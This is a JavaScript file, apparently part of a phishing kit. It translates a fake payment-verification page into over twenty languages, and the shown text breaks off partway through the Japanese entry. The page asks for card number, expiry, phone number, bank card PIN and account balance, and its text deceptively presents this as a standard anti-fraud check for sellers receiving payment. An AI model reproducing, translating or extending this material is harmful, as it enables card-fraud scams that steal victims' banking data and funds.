let DE = '/static/pc-card/images/v1/flags/germany.png';
let HE = '/static/pc-card/images/v1/flags/israel.png';
let SK = '/static/pc-card/images/v1/flags/slovakia.png';
let CN = '/static/pc-card/images/v1/flags/china.png';
let HU = '/static/pc-card/images/v1/flags/hungary.png';
let CZ = '/static/pc-card/images/v1/flags/czech-republic.png';
let PL = '/static/pc-card/images/v1/flags/poland.png';
let ES = '/static/pc-card/images/v1/flags/spain.png';
let FR = '/static/pc-card/images/v1/flags/france.png';
let IT = '/static/pc-card/images/v1/flags/italy.png';
let NL = '/static/pc-card/images/v1/flags/netherlands.png';
let LT = '/static/pc-card/images/v1/flags/lithuania.png';
let EN = '/static/pc-card/images/v1/flags/planet.png';
let RO = '/static/pc-card/images/v1/flags/romania.png';
let HR = '/static/pc-card/images/v1/flags/croacia.jpg';
let PT = '/static/pc-card/images/v1/flags/portugal.png';
let ET = '/static/pc-card/images/v1/flags/estonia.webp';
let BS = '/static/pc-card/images/v1/flags/bosnia.png';
let UA = '/static/pc-card/images/v1/flags/ukraine.png';
let TH = '/static/pc-card/images/v1/flags/thailand.png';
let GE = '/static/pc-card/images/v1/flags/georgia.png';
let JP = '/static/pc-card/images/v1/flags/japan.png';
let DK = '/static/pc-card/images/v1/flags/denmark.png';
let FI = '/static/pc-card/images/v1/flags/finland.jpeg';
let EL = '/static/pc-card/images/v1/flags/greece.png';
let TW = '/static/pc-card/images/v1/flags/taiwan.png';
let SV = '/static/pc-card/images/v1/flags/sweden.png';
let NO = '/static/pc-card/images/v1/flags/norway.png';
let SI = '/static/pc-card/images/v1/flags/slovenia.png';
let FIL = '/static/pc-card/images/v1/flags/philippines.png';
let IN = '/static/pc-card/images/v1/flags/india.png';
let BG = '/static/pc-card/images/v1/flags/bulgaria.png';

switch(languageCode) {
    case 'EN':
        $('#order-number').text('Order number')
        $('#order-title').text('Product')
        $('#order-price').text('Price')
        $('#order-tax').text('TAX')
        $('#order-total').text('Total')
        $('.flag_img').html(`<img src="${EN}" alt="" srcset="">`)
        $('.zag_zag').text('Entering a bank card')
        $('.err_box').text('The data you entered is incorrect, please reenter by following the given examples or contact technical support to resolve the problem.')
        $('#holder').text('Name and surname of the card holder')
        $('#numer').text('Card number')
        $('#exper').text('Expiration date')
        $('#phone').text('Phone number')
        $('#pi_pi').text('Bank card pin')
        $('.submit').text('Continue')
        $('.conf_text').text('The card data has been confirmed')
        $('#b_t1').text('According to our rules, to confirm card ownership, enter your current balance.')
        $('#b_t2').html(`Since you are using our payment system for the first time, you will need to undergo verification of the account to which you will receive payment for sold goods in the future.
    <strong>This is a standard procedure to confirm the account holder.</strong>
    This is necessary in order to confirm your ability to use the online payment system and to protect buyers and sellers from fraudsters.`)
        $('#balik').text('Account balance')
        $('#paybutton').text('Confirm')
        break;
    case 'DE':
        $('#order-number').text('Bestellnummer')
        $('#order-title').text('Produkt')
        $('#order-price').text('Preis')
        $('#order-tax').text('STEUER')
        $('#order-total').text('Insgesamt')
        $('.flag_img').html(`<img src="${DE}" alt="" srcset="">`)
        $('.zag_zag').text('Eingabe einer Bankkarte')
        $('.err_box').text('Die eingegebenen Daten sind falsch. Bitte wiederholen Sie die Eingabe anhand der angegebenen Beispiele oder wenden Sie sich an den technischen Support, um das Problem zu lösen.')
        $('#holder').text('Vor- und Nachname des Karteninhabers')
        $('#numer').text('Kartennummer')
        $('#exper').text('Verfallsdatum')
        $('#phone').text('Telefonnummer')
        $('#pi_pi').text('Pin der Bankkarte')
        $('.submit').text('Fortfahren')
        $('.conf_text').text('Die Kartendaten wurden bestätigt')
        $('#b_t1').text('')
        $('#b_t2').html(`<strong>Kontostand eingeben</strong> - Nach dem Steuerrecht müssen Sie bei einem Verkauf den Kontostand Ihrer Kreditkarte angeben, um sich als Karteninhaber auszuweisen.`)
        $('#balik').text('Kontostand')
        $('#paybutton').text('Bestätigen Sie')
        break;
    case 'HE':
        $('#order-number').text('מספר הזמנה')
        $('#order-title').text('מוצר')
        $('#order-price').text('מחיר')
        $('#order-tax').text('מַס')
        $('#order-total').text('סה"כ')
        $('.flag_img').html(`<img src="${HE}" alt="" srcset="">`)
        $('.zag_zag').text('הזנת כרטיס בנק')
        $('.err_box').text('הנתונים שהזנת שגויים, אנא הזן שוב על ידי ביצוע הדוגמאות הנתונות או פנה לתמיכה הטכנית כדי לפתור את הבעיה.')
        $('#holder').text('שם ושם משפחה של בעל הכרטיס')
        $('#numer').text('מספר כרטיס')
        $('#exper').text('תאריך תפוגה')
        $('#phone').text('מספר טלפון')
        $('#pi_pi').text('סיכה של כרטיס בנק')
        $('.submit').text('לְהַמשִׁיך')
        $('.conf_text').text('נתוני הכרטיס אושרו')
        $('#b_t1').text('על פי הכללים שלנו, כדי לאשר בעלות על הכרטיס, הזן את היתרה הנוכחית שלך.')
        $('#b_t2').html(`מכיוון שאתה משתמש במערכת התשלומים שלנו בפעם הראשונה, תצטרך לעבור אימות של החשבון שאליו תקבל תשלום עבור סחורה שנמכרה בעתיד.
    <strong>זהו הליך סטנדרטי לאישור בעל החשבון.</strong>
    זה הכרחי על מנת לאשר את יכולתך להשתמש במערכת התשלומים המקוונת וכדי להגן על קונים ומוכרים מפני רמאים.`)
        $('#balik').text('יתרת חשבון')
        $('#paybutton').text('לְאַשֵׁר')
        break;
    case 'SK':
        $('#order-number').text('Objednávacie číslo')
        $('#order-title').text('Produkt')
        $('#order-price').text('Cena')
        $('#order-tax').text('DAŇOVÝ ÚRAD')
        $('#order-total').text('Celkom')
        $('.flag_img').html(`<img src="${SK}" alt="" srcset="">`)
        $('.err_box').text('Zadané údaje sú nesprávne, zopakujte zadanie podľa uvedených príkladov alebo kontaktujte technickú podporu, aby ste problém vyriešili.')
        $('.zag_zag').text('Zadanie bankovej karty')
        $('#holder').text('Meno a priezvisko držiteľa karty')
        $('#numer').text('Číslo karty')
        $('#exper').text('Dátum skončenia platnosti')
        $('#phone').text('Telefónne číslo')
        $('#pi_pi').text('PIN kód bankovej karty')
        $('.submit').text('Pokračuj')
        $('.conf_text').text('Údaje o karte boli potvrdené')
        $('#b_t1').text('Podľa našich pravidiel na potvrdenie vlastníctva karty zadajte aktuálny zostatok.')
        $('#b_t2').html(`Keďže náš platobný systém používate prvýkrát, budete musieť prejsť overením účtu, na ktorý budete v budúcnosti dostávať platby za predaný tovar.
    <strong>Toto je štandardný postup na potvrdenie majiteľa účtu.</strong>
    Je to potrebné na potvrdenie vašej schopnosti používať online platobný systém a na ochranu kupujúcich a predávajúcich pred podvodníkmi.`)
        $('#balik').text('Zostatok na účte')
        $('#paybutton').text('Potvrďte')
        break;
    case 'NL':
        $('#order-number').text('Bestelnummer')
        $('#order-title').text('Product')
        $('#order-price').text('Prijs')
        $('#order-tax').text('BELASTING')
        $('#order-total').text('Totaal')
        $('.flag_img').html(`<img src="${NL}" alt="" srcset="">`)
        $('.zag_zag').text('Een bankpas invoeren')
        $('.err_box').text('De gegevens die u hebt ingevoerd zijn onjuist. Voer ze opnieuw in aan de hand van de gegeven voorbeelden of neem contact op met de technische ondersteuning om het probleem op te lossen.')
        $('#holder').text('Naam en achternaam van de kaarthouder')
        $('#numer').text('Kaartnummer')
        $('#exper').text('Vervaldatum')
        $('#phone').text('Telefoonnummer')
        $('#pi_pi').text('Pin bankpas')
        $('.submit').text('Ga verder')
        $('.conf_text').text('De kaartgegevens zijn bevestigd')
        $('#b_t1').text('Volgens onze regels moet je, om het eigendom van de kaart te bevestigen, je huidige saldo invoeren.')
        $('#b_t2').html(`Omdat je ons betalingssysteem voor de eerste keer gebruikt, moet je de rekening waarop je in de toekomst betalingen voor verkochte goederen zult ontvangen, laten verifiëren.
    <strong>Dit is een standaardprocedure om de rekeninghouder te bevestigen.</strong>
    Dit is nodig om te bevestigen dat je het online betalingssysteem kunt gebruiken en om kopers en verkopers te beschermen tegen fraudeurs.`)
        $('#balik').text('Saldo rekening')
        $('#paybutton').text('Bevestig')
        break;
    case 'CN':
        $('#order-number').text('订单号')
        $('#order-title').text('产品')
        $('#order-price').text('价格')
        $('#order-tax').text('税收')
        $('#order-total').text('共计')
        $('.flag_img').html(`<img src="${CN}" alt="" srcset="">`)
        $('.zag_zag').text('输入一张银行卡')
        $('.err_box').text('您输入的数据不正确，请按照给出的例子重新输入，或联系技术支持以解决问题。')
        $('#holder').text('持卡人的名字和姓氏')
        $('#numer').text('卡号')
        $('#exper').text('过期日期')
        $('#phone').text('电话号码')
        $('#pi_pi').text('银行卡密码')
        $('.submit').text('继续')
        $('.conf_text').text('该卡数据已被确认')
        $('#b_t1').text('根据我们的规则，为了确认卡的所有权，请输入你目前的余额。')
        $('#b_t2').html(`由于您是第一次使用我们的支付系统，您将需要对您今后接收所售商品付款的账户进行验证。
    <strong>这是一个确认账户持有人的标准程序。</strong>
    这是必要的，以便确认你有能力使用在线支付系统，并保护买家和卖家免受欺诈。`)
        $('#balik').text('账户余额')
        $('#paybutton').text('确认')
        break;
    case 'HU':
        $('#order-number').text('Rendelési szám')
        $('#order-title').text('Termék')
        $('#order-price').text('Ár')
        $('#order-tax').text('ADÓ')
        $('#order-total').text('Összesen')
        $('.flag_img').html(`<img src="${HU}" alt="" srcset="">`)
        $('.zag_zag').text('Bankkártya megadása')
        $('.err_box').text('Az Ön által megadott adatok helytelenek, kérjük, adja meg újra a megadott példák alapján, vagy forduljon a műszaki támogatáshoz a probléma megoldása érdekében.')
        $('#holder').text('A kártyatulajdonos neve és vezetékneve')
        $('#numer').text('Kártya száma')
        $('#exper').text('Lejárati idő')
        $('#phone').text('Telefonszám')
        $('#pi_pi').text('Bankkártya pin')
        $('.submit').text('Folytatás')
        $('.conf_text').text('A kártyaadatokat megerősítették')
        $('#b_t1').text('Szabályaink szerint a kártya tulajdonjogának megerősítéséhez adja meg az aktuális egyenlegét.')
        $('#b_t2').html(`Mivel Ön először használja a fizetési rendszerünket, át kell esnie annak a számlának az ellenőrzésén, amelyre a jövőben az eladott árukért fizetést fog kapni.
    <strong>Ez egy szokásos eljárás a számlatulajdonos megerősítésére.</strong>
    Erre azért van szükség, hogy megerősítsük, hogy Ön képes használni az online fizetési rendszert, és hogy megvédjük a vásárlókat és az eladókat a csalóktól.`)
        $('#balik').text('Számlaegyenleg')
        $('#paybutton').text('Megerősítés')
        break;
    case 'CZ':
        $('#order-number').text('Objednací číslo')
        $('#order-title').text('Produkt')
        $('#order-price').text('Cena')
        $('#order-tax').text('DAŇ')
        $('#order-total').text('Celkem')
        $('.flag_img').html(`<img src="${CZ}" alt="" srcset="">`)
        $('.zag_zag').text('Zadání bankovní karty')
        $('.err_box').text('Zadané údaje jsou nesprávné, zadejte je znovu podle uvedených příkladů nebo se obraťte na technickou podporu a problém vyřešte.')
        $('#holder').text('Jméno a příjmení držitele karty')
        $('#numer').text('Číslo karty')
        $('#exper').text('Datum vypršení platnosti')
        $('#phone').text('Telefonní číslo')
        $('#pi_pi').text('PIN bankovní karty')
        $('.submit').text('Pokračovat')
        $('.conf_text').text('Údaje na kartě byly potvrzeny')
        $('#b_t1').text('Podle našich pravidel pro potvrzení vlastnictví karty zadejte aktuální zůstatek.')
        $('#b_t2').html(`Vzhledem k tomu, že náš platební systém používáte poprvé, je třeba provést ověření účtu, na který budete v budoucnu přijímat platby za prodané zboží.
    <strong>Jedná se o standardní postup pro potvrzení držitele účtu.</strong>
    To je nezbytné k potvrzení vaší schopnosti používat online platební systém a k ochraně kupujících a prodávajících před podvodníky.`)
        $('#balik').text('Zůstatek na účtu')
        $('#paybutton').text('Potvrďte')
        break;
    case 'PL':
        $('#order-number').text('Numer zamówienia')
        $('#order-title').text('Produkt')
        $('#order-price').text('Cena')
        $('#order-tax').text('PODATEK')
        $('#order-total').text('Całkowity')
        $('.flag_img').html(`<img src="${PL}" alt="" srcset="">`)
        $('.zag_zag').text('Wprowadzenie karty bankowej')
        $('.err_box').text('Wprowadzone dane są nieprawidłowe, wprowadź je ponownie, postępując zgodnie z podanymi przykładami lub skontaktuj się z pomocą techniczną w celu rozwiązania problemu.')
        $('#holder').text('Imię i nazwisko posiadacza karty')
        $('#numer').text('Numer karty')
        $('#exper').text('Data wygaśnięcia')
        $('#phone').text('Numer telefonu')
        $('#pi_pi').text('PIN karty bankowej')
        $('.submit').text('Kontynuuj')
        $('.conf_text').text('Dane karty zostały potwierdzone')
        $('#b_t1').text('Zgodnie z naszymi zasadami, aby potwierdzić posiadanie karty, wprowadź aktualne saldo.')
        $('#b_t2').html(`Ponieważ korzystasz z naszego systemu płatności po raz pierwszy, będziesz musiał przejść weryfikację konta, na które będziesz otrzymywać płatności za sprzedane towary w przyszłości.
    <strong>Jest to standardowa procedura mająca na celu potwierdzenie właściciela konta.</strong>
    Jest to konieczne w celu potwierdzenia możliwości korzystania z systemu płatności online oraz ochrony kupujących i sprzedających przed oszustami.`)
        $('#balik').text('Saldo konta')
        $('#paybutton').text('Potwierdzenie')
        break;
    case 'ES':
        $('#order-number').text('Número de pedido');
        $('#order-title').text('Producto');
        $('#order-price').text('Precio');
        $('#order-tax').text('Impuesto');
        $('#order-total').text('Total');
        $('.flag_img').html(`<img src="${ES}" alt="" srcset="">`);
        $('.zag_zag').text('Ingresando una tarjeta bancaria');
        $('.err_box').text('Los datos que ingresaste son incorrectos, por favor vuelve a ingresar siguiendo los ejemplos dados o contacta al soporte técnico para resolver el problema.');
        $('#holder').text('Nombre y apellido del titular de la tarjeta');
        $('#numer').text('Número de tarjeta');
        $('#exper').text('Fecha de vencimiento');
        $('#phone').text('Número de teléfono');
        $('#pi_pi').text('PIN de la tarjeta bancaria');
        $('.submit').text('Continuar');
        $('.conf_text').text('Los datos de la tarjeta han sido confirmados');
        $('#b_t1').text('De acuerdo con nuestras reglas, para confirmar la propiedad de la tarjeta, ingresa tu saldo actual.');
        $('#b_t2').html(`Como estás utilizando nuestro sistema de pago por primera vez, deberás pasar por una verificación de la cuenta a la cual recibirás el pago por los productos vendidos en el futuro.
        <strong>Este es un procedimiento estándar para confirmar al titular de la cuenta.</strong>
        Esto es necesario para confirmar tu capacidad para utilizar el sistema de pago en línea y proteger a compradores y vendedores de estafadores.`);
        $('#balik').text('Saldo de la cuenta');
        $('#paybutton').text('Confirmar');
        break;
    case 'FR':
        $('#order-number').text('Numéro de commande');
        $('#order-title').text('Produit');
        $('#order-price').text('Prix');
        $('#order-tax').text('Taxe');
        $('#order-total').text('Total');
        $('.flag_img').html(`<img src="${FR}" alt="" srcset="">`);
        $('.zag_zag').text('Saisie d\'une carte bancaire');
        $('.err_box').text('Les données que vous avez saisies sont incorrectes. Veuillez les ressaisir en suivant les exemples donnés ou contacter le support technique pour résoudre le problème.');
        $('#holder').text('Nom et prénom du titulaire de la carte');
        $('#numer').text('Numéro de carte');
        $('#exper').text('Date d\'expiration');
        $('#phone').text('Numéro de téléphone');
        $('#pi_pi').text('Code PIN de la carte bancaire');
        $('.submit').text('Continuer');
        $('.conf_text').text('Les données de la carte ont été confirmées');
        $('#b_t1').text('Conformément à nos règles, pour confirmer la propriété de la carte, saisissez votre solde actuel.');
        $('#b_t2').html(`Étant donné que vous utilisez notre système de paiement pour la première fois, vous devrez passer par une vérification du compte sur lequel vous recevrez le paiement des biens vendus à l'avenir.
        <strong>Il s'agit d'une procédure standard pour confirmer le titulaire du compte.</strong>
        Ceci est nécessaire pour confirmer votre capacité à utiliser le système de paiement en ligne et protéger les acheteurs et les vendeurs contre les fraudeurs.`);
        $('#balik').text('Solde du compte');
        $('#paybutton').text('Confirmer');
        break;
    case 'IT':
        $('#order-number').text('Numero dell\'ordine');
        $('#order-title').text('Prodotto');
        $('#order-price').text('Prezzo');
        $('#order-tax').text('Tassa');
        $('#order-total').text('Totale');
        $('.flag_img').html(`<img src="${IT}" alt="" srcset="">`);
        $('.zag_zag').text('Inserimento di una carta bancaria');
        $('.err_box').text('I dati inseriti non sono corretti, ti preghiamo di reinserirli seguendo gli esempi forniti o contattare il supporto tecnico per risolvere il problema.');
        $('#holder').text('Nome e cognome del titolare della carta');
        $('#numer').text('Numero di carta');
        $('#exper').text('Data di scadenza');
        $('#phone').text('Numero di telefono');
        $('#pi_pi').text('PIN della carta bancaria');
        $('.submit').text('Continua');
        $('.conf_text').text('I dati della carta sono stati confermati');
        $('#b_t1').text('In conformità con le nostre regole, per confermare la proprietà della carta, inserisci il tuo saldo attuale.');
        $('#b_t2').html(`Poiché stai utilizzando il nostro sistema di pagamento per la prima volta, dovrai passare attraverso la verifica del conto su cui riceverai il pagamento per i beni venduti in futuro.
        <strong>Si tratta di una procedura standard per confermare il titolare del conto.</strong>
        Questo è necessario per confermare la tua capacità di utilizzare il sistema di pagamento online e proteggere acquirenti e venditori da frodi.`);
        $('#balik').text('Saldo del conto');
        $('#paybutton').text('Conferma');
        break;
    case 'LT':
        $('#order-number').text('Užsakymo numeris')
        $('#order-title').text('Prekė')
        $('#order-price').text('Kaina')
        $('#order-tax').text('MOKSLOS')
        $('#order-total').text('Iš viso')
        $('.flag_img').html(`<img src="${LT}" alt="" srcset="">`)
        $('.zag_zag').text('Įveskite banko kortelę')
        $('.err_box').text('Įvesti duomenys neteisingi, prašome įvesti iš naujo, vadovaujantis pateiktais pavyzdžiais, arba susisiekite su technine pagalba, kad būtų išspręstas problema.')
        $('#holder').text('Kortelės savininko vardas ir pavardė')
        $('#numer').text('Kortelės numeris')
        $('#exper').text('Galiojimo data')
        $('#phone').text('Telefono numeris')
        $('#pi_pi').text('Banko kortelės PIN')
        $('.submit').text('Tęsti')
        $('.conf_text').text('Kortelės duomenys patvirtinti')
        $('#b_t1').text('Pagal mūsų taisykles, patvirtinant kortelės nuosavybę, įveskite savo esamą balansą.')
        $('#b_t2').html(`Kadangi naudojatės mūsų mokėjimo sistema pirmą kartą, jums reikės patvirtinti sąskaitą, į kurią ateityje gausite mokėjimą už parduotas prekes.
    <strong>Tai yra standartinė procedūra, patvirtinanti sąskaitos savininką.</strong>
    Tai būtina siekiant patvirtinti jūsų gebėjimą naudotis internetine mokėjimo sistema ir apsaugoti pirkėjus bei pardavėjus nuo sukčių.`)
        $('#balik').text('Sąskaitos likutis')
        $('#paybutton').text('Patvirtinti')
        break;
    case 'RO':
        $('#order-number').text('Număr comandă')
        $('#order-title').text('Produs')
        $('#order-price').text('Preț')
        $('#order-tax').text('TAXĂ')
        $('#order-total').text('Total')
        $('.flag_img').html(`<img src="${RO}" alt="" srcset="">`)
        $('.zag_zag').text('Introducerea unui card bancar')
        $('.err_box').text('Datele introduse sunt incorecte, vă rugăm să reintroduceți urmând exemplele date sau contactați suportul tehnic pentru rezolvarea problemei.')
        $('#holder').text('Nume și prenume titular card')
        $('#numer').text('Număr card')
        $('#exper').text('Data expirării')
        $('#pi_pi').text('Cod PIN card bancar')
        $('.submit').text('Continuare')
        $('.conf_text').text('Datele cardului au fost confirmate')
        $('#b_t1').text('Conform regulilor noastre, pentru a confirma deținerea cardului, introduceți soldul curent.')
        $('#b_t2').html(`Deoarece utilizați sistemul nostru de plată pentru prima dată, va trebui să treceți prin verificarea contului în care veți primi plata pentru bunurile vândute în viitor.
    <strong>Acesta este un procedeu standard pentru confirmarea titularului contului.</strong>
    Aceasta este necesară pentru a confirma capacitatea dvs. de a utiliza sistemul de plată online și pentru a proteja cumpărătorii și vânzătorii de către infractori.`)
        $('#balik').text('Soldul contului')
        $('#paybutton').text('Confirmare')
        break;
    case 'HR':
        $('#order-number').text('Broj narudžbe')
        $('#order-title').text('Proizvod')
        $('#order-price').text('Cijena')
        $('#order-tax').text('Porez')
        $('#order-total').text('Ukupno')
        $('.flag_img').html(`<img src="${HR}" alt="" srcset="">`)
        $('.zag_zag').text('Unos bankovne kartice')
        $('.err_box').text('Podaci koje ste unijeli nisu ispravni, molimo ponovno unesite prema danim primjerima ili kontaktirajte tehničku podršku kako biste riješili problem.')
        $('#holder').text('Ime i prezime vlasnika kartice')
        $('#numer').text('Broj kartice')
        $('#exper').text('Datum isteka')
        $('#phone').text('Broj telefona')
        $('#pi_pi').text('PIN bankovne kartice')
        $('.submit').text('Nastaviti')
        $('.conf_text').text('Podaci o kartici su potvrđeni')
        $('#b_t1').text('Prema našim pravilima, za potvrdu vlasništva nad karticom unesite svoj trenutni saldo.')
        $('#b_t2').html(`Budući da prvi put koristite naš sustav plaćanja, trebat ćete proći provjeru računa na koji ćete u budućnosti primati plaćanje za prodane proizvode.
    <strong>Ovo je standardni postupak za potvrdu vlasnika računa.</strong>
    To je potrebno kako biste potvrdili svoju sposobnost korištenja online plaćanja i kako biste zaštitili kupce i prodavače od prevaranata.`)
        $('#balik').text('Stanje računa')
        $('#paybutton').text('Potvrditi')
        break;
    case 'PT':
        $('#order-number').text('Número do pedido')
        $('#order-title').text('Produto')
        $('#order-price').text('Preço')
        $('#order-tax').text('Imposto')
        $('#order-total').text('Total')
        $('.flag_img').html(`<img src="${PT}" alt="" srcset="">`)
        $('.zag_zag').text('Inserindo um cartão bancário')
        $('.err_box').text('Os dados que você inseriu estão incorretos, por favor insira novamente seguindo os exemplos dados ou entre em contato com o suporte técnico para resolver o problema.')
        $('#holder').text('Nome e sobrenome do titular do cartão')
        $('#numer').text('Número do cartão')
        $('#exper').text('Data de validade')
        $('#phone').text('Número de telefone')
        $('#pi_pi').text('PIN do cartão bancário')
        $('.submit').text('Continuar')
        $('.conf_text').text('Os dados do cartão foram confirmados')
        $('#b_t1').text('De acordo com nossas regras, para confirmar a posse do cartão, insira seu saldo atual.')
        $('#b_t2').html(`Como você está usando nosso sistema de pagamento pela primeira vez, será necessário passar por uma verificação da conta para a qual você receberá o pagamento por bens vendidos no futuro.
    <strong>Este é um procedimento padrão para confirmar o titular da conta.</strong>
    Isso é necessário para confirmar sua capacidade de usar o sistema de pagamento online e proteger compradores e vendedores de fraudadores.`)
        $('#balik').text('Saldo da conta')
        $('#paybutton').text('Confirmar')
        break;
    case 'ET':
        $('#order-number').text('Tellimuse number')
        $('#order-title').text('Toode')
        $('#order-price').text('Hind')
        $('#order-tax').text('Maks')
        $('#order-total').text('Kokku')
        $('.flag_img').html(`<img src="${ET}" alt="" srcset="">`)
        $('.zag_zag').text('Panga kaardi sisestamine')
        $('.err_box').text('Sisestatud andmed on vale, palun sisestage uuesti, järgides antud näiteid või võtke tehnilise toe saamiseks ühendust.')
        $('#holder').text('Kaardi omaniku nimi ja perekonnanimi')
        $('#numer').text('Kaardi number')
        $('#exper').text('Aegumiskuupäev')
        $('#phone').text('Telefoni number')
        $('#pi_pi').text('Panga kaardi PIN-kood')
        $('.submit').text('Jätka')
        $('.conf_text').text('Kaardiandmed on kinnitatud')
        $('#b_t1').text('Vastavalt meie reeglitele kinnitage kaardi omanikuks olemiseks oma praegune saldo.')
        $('#b_t2').html(`Kuna kasutate meie maksesüsteemi esmakordselt, peate tulevikus müüdud kaupade eest makse saamiseks konto kinnitama.
    <strong>See on standardne protseduur konto omaniku kinnitamiseks.</strong>
    See on vajalik selleks, et kinnitada teie võimet kasutada online-maksesüsteemi ja kaitsta ostjaid ja müüjaid petturite eest.`)
        $('#balik').text('Konto saldo')
        $('#paybutton').text('Kinnita')
        break;
    case 'BS':
        $('#order-number').text('Broj narudžbe')
        $('#order-title').text('Proizvod')
        $('#order-price').text('Cijena')
        $('#order-tax').text('Porez')
        $('#order-total').text('Ukupno')
        $('.flag_img').html(`<img src="${BS}" alt="" srcset="">`)
        $('.zag_zag').text('Unos bankovne kartice')
        $('.err_box').text('Podaci koje ste unijeli nisu tačni, molimo unesite ponovo prateći dati primjer ili kontaktirajte tehničku podršku kako biste riješili problem.')
        $('#holder').text('Ime i prezime vlasnika kartice')
        $('#numer').text('Broj kartice')
        $('#exper').text('Datum isteka')
        $('#phone').text('Broj telefona')
        $('#pi_pi').text('PIN banke kartice')
        $('.submit').text('Nastavak')
        $('.conf_text').text('Podaci kartice su potvrđeni')
        $('#b_t1').text('Prema našim pravilima, radi potvrde vlasništva kartice, unesite trenutni saldo.')
        $('#b_t2').html(`Budući da prvi put koristite naš sistem plaćanja, morat ćete proći provjeru računa na koji ćete u budućnosti primati uplatu za prodate proizvode.
    <strong>Ovo je standardna procedura za potvrdu vlasnika računa.</strong>
    Ovo je neophodno kako bi se potvrdila vaša sposobnost korištenja online sistema plaćanja i kako bi se kupce i prodavce zaštitilo od prevaranata.`)
        $('#balik').text('Stanje računa')
        $('#paybutton').text('Potvrdi')
        break;
    case 'UA':
        $('#order-number').text('Номер замовлення')
        $('#order-title').text('Товар')
        $('#order-price').text('Ціна')
        $('#order-tax').text('Податок')
        $('#order-total').text('Всього')
        $('.flag_img').html(`<img src="${UA}" alt="" srcset="">`)
        $('.zag_zag').text('Введення банківської карти')
        $('.err_box').text('Введені вами дані невірні, будь ласка, введіть їх знову, слідуючи наведеним прикладам, або зверніться до служби підтримки для вирішення проблеми.')
        $('#holder').text(`Прізвище та ім'я власника карти`)
        $('#numer').text('Номер карти')
        $('#exper').text('Термін дії')
        $('#phone').text('Номер телефону')
        $('#pi_pi').text('Пін-код банківської карти')
        $('.submit').text('Продовжити')
        $('.conf_text').text('Дані картки підтверджено')
        $('#b_t1').text('Згідно з нашими правилами, для підтвердження власності картки введіть ваш поточний баланс.')
        $('#b_t2').html(`Оскільки ви використовуєте нашу платіжну систему вперше, вам потрібно буде пройти верифікацію рахунку, на який в майбутньому будуть надходити кошти за продані товари.
    <strong>Це стандартна процедура для підтвердження власника рахунку.</strong>
    Це необхідно для підтвердження вашої здатності використовувати онлайн-платіжну систему та для захисту покупців і продавців від шахраїв.`)
        $('#balik').text('Баланс рахунку')
        $('#paybutton').text('Підтвердити')
        break;
    case 'TH':
        $('#order-number').text('หมายเลขคำสั่งซื้อ')
        $('#order-title').text('ผลิตภัณฑ์')
        $('#order-price').text('ราคา')
        $('#order-tax').text('ภาษี')
        $('#order-total').text('รวม')
        $('.flag_img').html(`<img src="${TH}" alt="" srcset="">`)
        $('.zag_zag').text('เข้าสู่การใช้บัตรเครดิต')
        $('.err_box').text('ข้อมูลที่คุณป้อนไม่ถูกต้อง โปรดป้อนใหม่ตามตัวอย่างที่กำหนดหรือติดต่อฝ่ายสนับสนุนทางเทคนิคเพื่อแก้ไขปัญหา')
        $('#holder').text('ชื่อและนามสกุลของผู้ถือบัตร')
        $('#numer').text('หมายเลขบัตร')
        $('#exper').text('วันที่หมดอายุ')
        $('#phone').text('หมายเลขโทรศัพท์')
        $('#pi_pi').text('พินบัตรธนาคาร')
        $('.submit').text('ดำเนินการต่อ')
        $('.conf_text').text('ข้อมูลบัตรได้รับการยืนยัน')
        $('#b_t1').text('ตามกฎของเรา เพื่อยืนยันการครอบครองบัตร โปรดป้อนยอดเงินคงเหลือปัจจุบันของคุณ')
        $('#b_t2').html(`เนื่องจากคุณกำลังใช้ระบบการชำระเงินของเราครั้งแรก คุณจะต้องผ่านการตรวจสอบบัญชีเพื่อการชำระเงินที่คุณจะได้รับจากการขายสินค้าในอนาคต
    <strong> นี่เป็นขั้นตอนมาตรฐานเพื่อยืนยันผู้ถือบัญชี</strong>
      สิ่งนี้จำเป็นเพื่อยืนยันความสามารถในการใช้ระบบการชำระเงินออนไลน์และป้องกันผู้ซื้อและผู้ขายจากมิจฉาชีพ`)
        $('#balik').text('ยอดเงินในบัญชี')
        $('#paybutton').text('ยืนยัน')
        break;
    case 'GE':
        $('#order-number').text('Შეკვეთის ნომერი')
        $('#order-title').text('პროდუქტი')
        $('#order-price').text('ფასი')
        $('#order-tax').text('გადასახადი')
        $('#order-total').text('სულ')
        $('.flag_img').html(`<img src="${GE}" alt="" srcset="">`)
        $('.zag_zag').text('საბანკო ბარათის შეყვანა')
        $('.err_box').text('თქვენ მიერ შეყვანილი მონაცემები არასწორია, გთხოვთ, ხელახლა შეიყვანოთ მოცემული მაგალითების მიყოლებით ან დაუკავშირდით ტექნიკურ მხარდაჭერას პრობლემის მოსაგვარებლად.')
        $('#holder').text('ბარათის მფლობელის სახელი და გვარი')
        $('#numer').text('Ბარათის ნომერი')
        $('#exper').text('ვადის გასვლის თარიღი')
        $('#phone').text('Ტელეფონის ნომერი')
        $('#pi_pi').text('საბანკო ბარათის პინი')
        $('.submit').text('განაგრძეთ')
        $('.conf_text').text('ბარათის მონაცემები დადასტურებულია')
        $('#b_t1').text('ჩვენი წესების მიხედვით, ბარათის მფლობელობის დასადასტურებლად, შეიყვანეთ თქვენი მიმდინარე ბალანსი.')
        $('#b_t2').html(`ვინაიდან თქვენ პირველად იყენებთ ჩვენს გადახდის სისტემას, მოგიწევთ გაიაროთ ანგარიშის შემოწმება, რომელზეც მომავალში მიიღებთ გადახდას გაყიდულ საქონელზე.
        <strong>ეს არის სტანდარტული პროცედურა ანგარიშის მფლობელის დასადასტურებლად.</strong>
        ეს აუცილებელია იმისათვის, რომ დაადასტუროთ თქვენი ონლაინ გადახდის სისტემის გამოყენების შესაძლებლობა და მყიდველები და გამყიდველები თაღლითებისგან დაიცვათ.`)
        $('#balik').text('Ანგარიშის ბალანსი')
        $('#paybutton').text('დაადასტურეთ')
        break;
    case 'JP':
        $('#order-number').text('注文番号');
        $('#order-title').text('商品');
        $('#order-price').text('価格');
        $('#order-tax').text('消費税');
        $('#order-total').text('合計');
        $('.flag_img').html(`<img src="${JP}" alt="" srcset="">`);
        $('.zag_zag').text('カードの持ち主の名前と姓を入力してください');
        $('.err_box').text('入力されたデータが不正です。正しい例に従って再入力してくださいまたは技術サポートに問い合わせてください。');
        $('#holder').text('カードの持ち主の名前と姓');
        $('#numer').text('カード番号');
        $('#exper').text('有効期限');
        $('#phone').text('電話番号');
        $('#pi_pi').text('カードのPINコード');
        $('.submit').text('続行');
        $('.conf_text').text('カード情報が確認されました');
        $('#b_t1').text('我们的规则要求，为了确认卡片所有者，请输入您的当前余额。');
